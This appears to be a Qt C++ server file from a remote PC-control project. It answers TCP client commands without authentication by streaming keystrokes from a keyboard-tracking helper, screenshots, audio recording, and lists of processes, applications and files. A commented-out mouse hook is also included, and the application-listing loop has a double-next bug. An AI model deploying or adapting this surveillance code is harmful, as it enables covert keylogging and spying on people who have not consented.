
#include "server.h"
#include "keyboard_track.h"

#include <QDebug>
#include <QApplication>
#include <QScreen>

Server::Server(QObject *parent)
    : QObject{parent}
{
    initServer();
//    myFileExplorer = new fileExplorer;
    connect(tcpServer, &QTcpServer::newConnection, this, &Server::newConnection);

    clients = QList<QTcpSocket*>();
}

//Server::~Server() {
//    delete processKeyboardTrack;
//    delete processListProcesses;
//}

void Server::initServer()
{
    tcpServer = new QTcpServer(this);
    if (!tcpServer->listen()) {
//        QMessageBox::critical(this, tr("Fortune Server"),
//                              tr("Unable to start the server: %1.")
//                                  .arg(tcpServer->errorString()));
        qDebug() << "Unable to start server.";
        return;
    }

//    const QList<QHostAddress> ipAddressesList = QNetworkInterface::allAddresses();
//    // use the first non-localhost IPv4 address
//    for (const QHostAddress &entry : ipAddressesList) {
//        if (entry != QHostAddress::LocalHost && entry.toIPv4Address()) {
//            ipAddress = entry.toString();
//            break;
//        }
//    }
//    // if we did not find one, use IPv4 localhost
//    if (ipAddress.isEmpty())
//        ipAddress = QHostAddress(QHostAddress::LocalHost).toString();

    //First enumerate all network adapters

    HKEY hNetCardsKey;
    LSTATUS lStatus = ERROR_SUCCESS;

    lStatus = RegOpenKey(HKEY_LOCAL_MACHINE,
                         NETCARD_ROOT,
                         &hNetCardsKey);

    if(ERROR_SUCCESS == lStatus)
    {
        DWORD dwCards = 0L;
        DWORD dwMaxSubkeyNameLen = 0L;
        lStatus = RegQueryInfoKey(hNetCardsKey, NULL, NULL, NULL, &dwCards,
                                  &dwMaxSubkeyNameLen, NULL, NULL, NULL, NULL, NULL, NULL);

        if(ERROR_SUCCESS == lStatus && dwCards)
        {
            for(DWORD i = 0; i < dwCards; i++)
            {
                TCHAR wszCurrentCardIdxName[MAX_PATH];
                wszCurrentCardIdxName[0] = '\0';
                lStatus = RegEnumKey(hNetCardsKey, i,
                                     wszCurrentCardIdxName, MAX_PATH);

                if(ERROR_SUCCESS == lStatus)
                {
                    TCHAR wszAdapterKeyName[MAX_PATH];
                    wszAdapterKeyName[0] = '\0';

                    wsprintf(wszAdapterKeyName, L"%s\\%s", NETCARD_ROOT,
                             wszCurrentCardIdxName);

                    HKEY hCardNameKey;

                    lStatus = RegOpenKey(
                        HKEY_LOCAL_MACHINE,
                        wszAdapterKeyName,
                        &hCardNameKey);

                    if(ERROR_SUCCESS == lStatus)
                    {
                        TCHAR wszServiceNameGuid[MAX_PATH];
                        TCHAR wszAdapterName[MAX_PATH];

                        DWORD dwSize = sizeof(wszServiceNameGuid);
                        wszServiceNameGuid[0] = '\0';
                        RegQueryValueEx(
                            hCardNameKey,
                            L"ServiceName",
                            NULL,
                            NULL,
                            (LPBYTE)wszServiceNameGuid,
                            &dwSize);

                        dwSize = sizeof(wszAdapterName);
                        RegQueryValueEx(
                            hCardNameKey,
                            L"Description",
                            NULL,
                            NULL,
                            (LPBYTE)wszAdapterName,
                            &dwSize);

                        OutputDebugStringW(wszServiceNameGuid);
                        OutputDebugStringW(L"\n");

                        RegCloseKey(hCardNameKey);

                        //Get parameters
                        TCHAR wszCardParamKey[MAX_PATH];
                        wszCardParamKey[0] = '\0';
                        wsprintf(wszCardParamKey,L"%s\\%s", TCPIP_ROOT, wszServiceNameGuid);

                        HKEY hParamKey = NULL;

                        lStatus = RegOpenKey(
                            HKEY_LOCAL_MACHINE,
                            wszCardParamKey,
                            &hParamKey);

                        if(ERROR_SUCCESS == lStatus)
                        {
                            DWORD dwEnabledDHCP = 0L;
                            DWORD dwDWSize = sizeof(DWORD);
                            TCHAR wszStaticIP[32];
                            TCHAR wszDHCPIP[32];
                            DWORD dwIPSize = sizeof(wszDHCPIP);

                            ZeroMemory(wszDHCPIP, dwIPSize);
                            ZeroMemory(wszStaticIP, dwIPSize);

                            lStatus = RegQueryValueEx(
                                hParamKey,
                                L"EnableDHCP",
                                NULL, NULL,
                                (LPBYTE)&dwEnabledDHCP,
                                &dwDWSize);

                            if(SUCCEEDED(lStatus))
                            {
//                                wprintf_s(L"Adapter : %s [%s] \n\tDHCP : %s\n",
//                                          wszServiceNameGuid,
//                                          wszAdapterName,
//                                          dwEnabledDHCP
//                                              ? L"Yes" : L"No");
                                adapterNamesList.push(QString(wszAdapterName));
                            }

                            lStatus = RegQueryValueEx(
                                hParamKey,
                                L"IPAddress",
                                NULL,
                                NULL,
                                (LPBYTE)&wszStaticIP,
                                &dwIPSize);

                            if(SUCCEEDED(lStatus))
                            {
//                                wprintf_s(L"\tConfigured IP Address : %s\n", wszStaticIP);
                            }

                            dwIPSize = sizeof(wszDHCPIP);
                            lStatus = RegQueryValueEx(
                                hParamKey,
                                L"DhcpIPAddress",
                                NULL,
                                NULL,
                                (LPBYTE)&wszDHCPIP,
                                &dwIPSize);

                            if(SUCCEEDED(lStatus))
                            {
//                                wprintf_s(L"\tDHCP IP Address : %s\n", wszDHCPIP);
                                ipAddressList.push(QString(wszDHCPIP));
                            }

//                            wprintf_s(L"\n");

                            RegCloseKey(hParamKey);
                        }

                    }
                }
            }
        }


        RegCloseKey(hNetCardsKey);
    }


    //! [1]
    port = QString::number(tcpServer->serverPort());
}

void Server::sendMessage(QTcpSocket* sender, const QString &msg)
{
    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    out << tr("string") << msg;
    sender->write(block);
}

void Server::sendScreenshot(QTcpSocket* sender, const QPixmap &screenshot) {
    QPixmap resizedScreenshot = screenshot.scaled(800, 800, Qt::KeepAspectRatio, Qt::SmoothTransformation);

    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

//    out << tr("image") << screenshot;
//    curClient->write(block);
    QByteArray byteArray;
    QBuffer buffer(&byteArray);
    buffer.open(QIODevice::WriteOnly);
    resizedScreenshot.save(&buffer, "PNG");
    out << tr("image") << byteArray;
    sender->write(block);
}

void Server::sendFileStructure(QTcpSocket* sender, const QStringList &fileStruct)
{
    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    out << tr("file") << fileStruct;
    sender->write(block);
}

void Server::sendApplications(QTcpSocket* sender, const QStringList &appList)
{
    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    out << tr("list applications") << appList;
    sender->write(block);
}

void Server::readMessage() {
    QTcpSocket *clientConnection = static_cast<QTcpSocket*>(sender());
    if (clientConnection != nullptr) {
        qDebug() << "read message client connection not null";
    }
    qDebug() << "A message just got to server!";

    in.setDevice(clientConnection);
    in.setVersion(QDataStream::Qt_6_5);
    in.startTransaction();

    QString message;
    in >> message;

    if (!in.commitTransaction())
        return;

//    statusLabel->setText(message);

    if (message == tr("list applications")) {
//        sendMessage(clientConnection, "here are the applications: ");
        QStringList paths = QStandardPaths::standardLocations(QStandardPaths::ApplicationsLocation);
//        QStringList paths;
//        paths << "%programdata%\\Microsoft\\Windows\\Start Menu\\Programs";
        QStringList applications;
        for (const QString &path : paths)
        {
//            QDir dir(path);
            QDirIterator it(path, {"*.exe","*.lnk"}, QDir::Files, QDirIterator::Subdirectories);
            while (it.hasNext()) {
                qDebug() << it.next();
                applications.append(it.next());
            }
        }
        sendApplications(clientConnection, applications);

        qDebug() << applications;

//        tracking_keyboard();
    }
    else if (message == tr("list processes")) {
//        sendMessage(clientConnection, "here are the processes: ");
        processListProcesses = new QProcess();
        processListProcesses->start("D:\\_Codes\\Qt_Creator_Projects\\PC_Remote_Control\\list_processes.exe");
//        connect(processListProcesses, &QProcess::readyReadStandardOutput, this, &Server::processDataProcess);
        connect(processListProcesses, &QProcess::readyReadStandardOutput, this, [=]() {
            sendProcesses(clientConnection);
        });
        //        startHook();
    }
    else if (message == tr("keyboard track")) {
        qDebug() << "keyboard tracking started?";
        processKeyboardTrack = new QProcess();
        processKeyboardTrack->start("D:\\_Codes\\Qt_Creator_Projects\\PC_Remote_Control\\keyboard_track.exe");
//        connect(processKeyboardTrack, &QProcess::readyReadStandardOutput, this, &Server::processData);
        connect(processKeyboardTrack, &QProcess::readyReadStandardOutput, this, [=]() {
            sendKeyboardTrack(clientConnection);
        });
    }
    else if (message == tr("take screenshot")) {
        qDebug() << "taken screenshot";
//        QPixmap screenshot = QGuiApplication::primaryScreen()->grabWindow(0);
////        emit(display(screenshot));
//        sendScreenshot(screenshot);
        QTimer *timer = new QTimer;
        connect(timer, &QTimer::timeout, this, [=]() {
            stream(clientConnection);
        });
        timer->start();
        QTimer::singleShot(3000, timer, &QTimer::stop);
    }
    else if (message == tr("show directories")) {
        qDebug() << "show directories";
        QFileSystemModel model;
        model.setRootPath("C:\\");
//        sendFileStructure(model);
    }
    else if (message == tr("recording")){
        if (recorder == nullptr)
            recorder = new AudioRecorder;
        recorder->show();

        recorder->auto_start();
    }
    else if (message == tr("stop_recording")){
        recorder->stop_by_msg();
        delete recorder;
    }
    else if (message == "ls") {
        //        QString dirPath = args.size() > 1 ? args[1] : ".";
        QString dirPath = ".";
        QDir dir(dirPath);
        QStringList entries = dir.entryList();
        QString response = entries.join("\n");
        sendFileStructure(clientConnection, entries);
        qDebug() << entries << "\n";
        //        clientSocket->flush();
    }

    emit(readyRead(message));
}

void Server::stream(QTcpSocket* clientConnection) {
    QPixmap screenshot = QGuiApplication::primaryScreen()->grabWindow(0);
    //        emit(display(screenshot));
    sendScreenshot(clientConnection, screenshot);
}

void Server::sendKeyboardTrack(QTcpSocket* clientSocket) {
    QProcess *process = static_cast<QProcess*>(sender());
    qDebug() << "is this on?";
    QString data = process->readAllStandardOutput();
    sendMessage(clientSocket, data);
}

void Server::sendProcesses(QTcpSocket* clientSocket) {
    QProcess *process = static_cast<QProcess *>(sender());
    qDebug() << "listing processing?";
    QString output = process->readAllStandardOutput();
    QStringList lines = output.split('\n');

//    foreach (QString line, lines) {
//        QList<QString>info  = line.split(' ', Qt::SkipEmptyParts);
//        if (info.size() > 1)
//            qDebug() << info[0] << info[1];
////        qDebug() << line;
//    }
    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    out << tr("list processes") << lines;
    clientSocket->write(block);
//    sendMessage(clientSocket, tr("huhu"));
}

void Server::newConnection() {
    QTcpSocket *clientConnection = tcpServer->nextPendingConnection();
    connect(clientConnection, &QTcpSocket::readyRead, this, &Server::readMessage);
    connect(clientConnection, &QTcpSocket::disconnected, this, &Server::disconnected);
    clients.append(clientConnection);
    qDebug() << "incoming connection.";
    sendMessage(clientConnection, "ayooo");
}

void Server::disconnected() {
    QTcpSocket *clientSocket = static_cast<QTcpSocket*>(sender());
    clients.removeOne(clientSocket);
}




//QTcpServer * Server::getServer() {
//    return tcpServer;
//}

//LRESULT CALLBACK Server::MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
//    // Check if the message is a mouse click event
//    if (nCode < HC_ACTION)
//        return CallNextHookEx(NULL, nCode, wParam, lParam);

//    std::string eventType = "";

//    if (wParam == WM_MOUSEMOVE || wParam == WM_LBUTTONDOWN ||
//        wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
//        // Extract the mouse coordinates from the LPARAM
//        POINT cursorPos;
//        GetCursorPos(&cursorPos);

//        // Print the mouse coordinates to the console
//        switch (wParam)
//        {
//        case WM_MOUSEMOVE:
//            eventType = "move";
//            break;
//        case WM_LBUTTONDOWN:
//            eventType = "lclick";
//            break;
//        case WM_RBUTTONDOWN:
//            eventType = "rclick";
//            break;
//        case WM_MBUTTONDOWN:
//            eventType = "mclick";
//            break;
//        }

//        std::stringstream ss;
//        ss << eventType << " at ("
//                  << cursorPos.x << ", "
//                  << cursorPos.y << ")\n";
//        QString data = QString::fromStdString(ss.str());
//        sendMessage(data);
//    }
//    else if (wParam == WM_MOUSEWHEEL || wParam == WM_MOUSEHWHEEL) {
//        eventType = "wheel";

//        switch (wParam)
//        {
//        case WM_MOUSEWHEEL:
//            eventType = "vwheel";
//            break;
//        case WM_MOUSEHWHEEL:
//            eventType = "hwheel";
//            break;
//        }

//        MSLLHOOKSTRUCT* pMhs = (MSLLHOOKSTRUCT*)lParam;
//        short zDelta = HIWORD(pMhs->mouseData);

//        int scrollAmount = GET_WHEEL_DELTA_WPARAM(wParam);
//        if (scrollAmount != 0)
//            std::cout << eventType << " " << scrollAmount << " units\n";

//        // Convert the scroll amount to lines or pages depending on the scroll bar orientation
//        // int scrollLines = scrollAmount / WHEEL_DELTA;
//        // int scrollPages = scrollAmount / (WHEEL_DELTA * 3);

//        // Print out the scroll distance
//        std::cout << eventType << " " << zDelta << " units\n";
//    }

//    // Call the next hook in the chain
//    return CallNextHookEx(NULL, nCode, wParam, lParam);
//}

//void Server::startHook() {
//    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookProc, NULL, 0);
//    if (mouseHook == NULL) {
//        std::cerr << "Failed to set mouse hook.\n";
//    }
//}

//void Server::stopHook() {
//    if (mouseHook != NULL) {
//        UnhookWindowsHookEx(mouseHook);
//    }
//}


